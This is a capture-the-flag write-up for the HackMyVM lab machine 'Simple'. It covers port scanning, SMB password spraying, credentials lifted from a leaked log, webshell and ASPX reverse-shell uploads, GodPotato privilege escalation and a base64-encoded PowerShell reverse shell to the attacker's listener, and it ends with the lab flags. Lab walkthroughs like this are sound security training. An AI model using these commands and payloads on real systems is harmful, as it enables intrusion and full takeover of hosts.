# Simple

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.136:445
Open 10.0.2.136:80
Open 10.0.2.136:135
Open 10.0.2.136:139
Open 10.0.2.136:5985
Open 10.0.2.136:47001
Open 10.0.2.136:49664
Open 10.0.2.136:49665
Open 10.0.2.136:49666
Open 10.0.2.136:49667
Open 10.0.2.136:49668
Open 10.0.2.136:49669
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.136
PORT      STATE SERVICE       REASON  VERSION
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Simple
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| nbstat: NetBIOS name: SIMPLE, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:bb:79:ac (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| Names:
|   SIMPLE<00>           Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   SIMPLE<20>           Flags: <unique><active>
| Statistics:
|   08:00:27:bb:79:ac:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-12-12T08:18:24
|_  start_date: N/A
|_clock-skew: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 41675/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 58570/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 14783/udp): CLEAN (Timeout)
|   Check 4 (port 40073/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```
:::

## HTTP

Potential usernames: `ruy, marcos, lander, bogo, vaiper`

![writeup.png](/assets/pentest/hackmyvm/simple/writeup.png)

Probably nothing much on webserver
```bash
└─$ feroxbuster -u http://10.0.2.136 --thorough -D -C 404,400,414,500,403 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php
200      GET       50l       96w     1481c http://10.0.2.136/
301      GET        2l       10w      159c http://10.0.2.136/Images => http://10.0.2.136/Images/
301      GET        2l       10w      166c http://10.0.2.136/aspnet_client => http://10.0.2.136/aspnet_client/
301      GET        2l       10w      158c http://10.0.2.136/fonts => http://10.0.2.136/fonts/
301      GET        2l       10w      159c http://10.0.2.136/images => http://10.0.2.136/images/
200      GET       50l       96w     1481c http://10.0.2.136/index.html
```

CSS comes from `03-comming-soon`, but it's not indexable.
```bash
└─$ curl http://10.0.2.136/ -s | htmlq '*' -a href | sort | uniq
#
03-comming-soon/css/responsive.css
03-comming-soon/css/styles.css
common-css/ionicons.css
common-css/jquery.classycountdown.css
https://fonts.googleapis.com/css?family=Open+Sans:400,700%7CPoppins:400,500
```

## SMB

### Bruteforce

Try usernames as passwords?
```bash
└─$ echo 'ruy, marcos, lander, bogo, vaiper' | sed 's/, /\n/g' | tee users.txt
ruy
marcos
lander
bogo
vaiper

└─$ netexec smb 10.0.2.136 -u users.txt -p users.txt --no-bruteforce --continue-on-success
SMB         10.0.2.136      445    SIMPLE           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SIMPLE) (domain:Simple) (signing:False) (SMBv1:None)
SMB         10.0.2.136      445    SIMPLE           [-] Simple\ruy:ruy STATUS_LOGON_FAILURE
SMB         10.0.2.136      445    SIMPLE           [-] Simple\marcos:marcos STATUS_LOGON_FAILURE
SMB         10.0.2.136      445    SIMPLE           [-] Simple\lander:lander STATUS_LOGON_FAILURE
SMB         10.0.2.136      445    SIMPLE           [-] Simple\bogo:bogo STATUS_PASSWORD_EXPIRED
SMB         10.0.2.136      445    SIMPLE           [-] Simple\vaiper:vaiper STATUS_LOGON_FAILURE
```

### Bogo

AFAIK this is actually a bug, you can't change your own password with this machine's policy so you have to manually reset password from VM. The `bogo` as password should work.
```bash
└─$ netexec smb 10.0.2.136 -u 'bogo' -p 'bogo'  -M change-password -o NEWPASS='Password123$'
SMB         10.0.2.136      445    SIMPLE           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SIMPLE) (domain:Simple) (signing:False) (SMBv1:None)
SMB         10.0.2.136      445    SIMPLE           [-] Simple\bogo:bogo STATUS_PASSWORD_EXPIRED
CHANGE-P... 10.0.2.136      445    SIMPLE           [-] SMB-SAMR password change failed: rpc_s_access_denied
```

After small surgery inside VM login is successful
```bash
└─$ netexec smb 10.0.2.136 -u 'bogo' -p 'bogo'  --shares
SMB         10.0.2.136      445    SIMPLE           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SIMPLE) (domain:Simple) (signing:False) (SMBv1:None)
SMB         10.0.2.136      445    SIMPLE           [+] Simple\bogo:bogo
SMB         10.0.2.136      445    SIMPLE           [*] Enumerated shares
SMB         10.0.2.136      445    SIMPLE           Share           Permissions     Remark
SMB         10.0.2.136      445    SIMPLE           -----           -----------     ------
SMB         10.0.2.136      445    SIMPLE           ADMIN$                          Admin remota
SMB         10.0.2.136      445    SIMPLE           C$                              Recurso predeterminado
SMB         10.0.2.136      445    SIMPLE           IPC$            READ            IPC remota
SMB         10.0.2.136      445    SIMPLE           LOGS            READ
SMB         10.0.2.136      445    SIMPLE           WEB
```

```bash
└─$ impacket-smbclient 'SIMPLE'/'bogo':'bogo'@10.0.2.136
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# use LOGS
# ls
drw-rw-rw-          0  Sun Oct  8 17:23:36 2023 .
drw-rw-rw-          0  Sun Oct  8 17:23:36 2023 ..
-rw-rw-rw-       2200  Sun Oct  8 17:23:36 2023 20231008.log
# cat 20231008.log
...
PS C:\> net use \\127.0.0.1\WEB /user:marcos SuperPassword
Se ha completado el comando correctamente.

PS C:\> dir \\127.0.0.1\WEB
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        10/8/2023   9:46 PM                aspnet_client
-a----        9/26/2023   6:46 PM            703 iisstart.htm
-a----        10/8/2023  10:46 PM            158 test.php

PS C:\> rm \\127.0.0.1\WEB\*.php
PS C:\> dir \\127.0.0.1\WEB
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        10/8/2023   9:46 PM                aspnet_client
-a----        9/26/2023   6:46 PM            703 iisstart.htm
# exit
```

### Marcos

Again, little surgery to make VM work as intended
```bash
└─$ impacket-smbclient 'SIMPLE'/'marcos':'SuperPassword'@10.0.2.136
[-] SMB SessionError: code: 0xc0000071 - STATUS_PASSWORD_EXPIRED - The user account password has expired.
```

```bash
└─$ impacket-smbclient 'SIMPLE'/'marcos':'SuperPassword'@10.0.2.136
# shares
ADMIN$
C$
IPC$
LOGS
WEB
# use WEB
# ls
drw-rw-rw-          0  Sun Oct  8 11:14:23 2023 .
drw-rw-rw-          0  Sun Oct  8 11:14:23 2023 ..
drw-rw-rw-          0  Sun Oct  8 17:22:20 2023 03-comming-soon
drw-rw-rw-          0  Sun Oct  8 16:00:33 2023 aspnet_client
drw-rw-rw-          0  Sun Oct  8 17:18:47 2023 common-js
drw-rw-rw-          0  Sun Oct  8 17:18:47 2023 fonts
drw-rw-rw-          0  Sun Oct  8 17:18:47 2023 images
-rw-rw-rw-       1481  Sun Oct  8 17:26:47 2023 index.html
# put /opt/scripts/shells/p0wny-shell/shell.php
# ls shell.php
-rw-rw-rw-      20321  Fri Dec 12 03:56:10 2025 shell.php
```

## RCE

PHP uploaded, but we get 404
```bash
└─$ curl http://10.0.2.136/shell.php -is | head -1
HTTP/1.1 404 Not Found
```

ASP is also not successful
```bash
# put /usr/share/webshells/aspx/cmdasp.aspx
---
└─$ curl http://10.0.2.136/cmdasp.aspx -is | head -1
HTTP/1.1 200 OK
```

![writeup-1.png](/assets/pentest/hackmyvm/simple/writeup-1.png)

```bash
└─$ curl https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/refs/heads/master/shell.aspx -Ls | sed -e 's/127.0.0.1/10.0.2.15/' -e 's/1234/4444/' > rev.aspx
# put rev.aspx
---
└─$ curl http://10.0.2.136/rev.aspx
---
└─$ listen
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.0.2.136:49699.
Spawn Shell...
c:\windows\system32\inetsrv>whoami
iis apppool\defaultapppool
```

## Privilege Escalation

`SeImpersonatePrivilege` privilege can be abused to escalate permissions.
- [Abusing Tokens](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html#abusing-tokens)
- [Windows Privilege Escalation: SeImpersonatePrivilege](https://www.hackingarticles.in/windows-privilege-escalation-seimpersonateprivilege/)

Download compiled binary
```bash
└─$ curl https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe -Lso godpotato.exe
```

Upload via SMB
```
# put godpotato.exe
```

Execute
```bash
c:\inetpub\wwwroot>.\godpotato.exe -cmd "whoami"
nt authority\system
```

Get reverse shell -> [https://www.revshells.com](https://www.revshells.com) -> Powershell #3 Base64
```bash
c:\inetpub\wwwroot>.\godpotato.exe -cmd "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMAAuADIALgAxADUAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
---
└─$ listen
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.0.2.136:49718.

PS C:\inetpub\wwwroot> whoami
nt authority\system
```

## Flags

```bash
PS C:\Users> cat marcos/Desktop/user.txt
SIMPLE{ASPXT0SH311}
PS C:\Users> cat Administrador/Desktop/root.txt
SIMPLE{S31MP3R50N4T3PR1V1L363}
```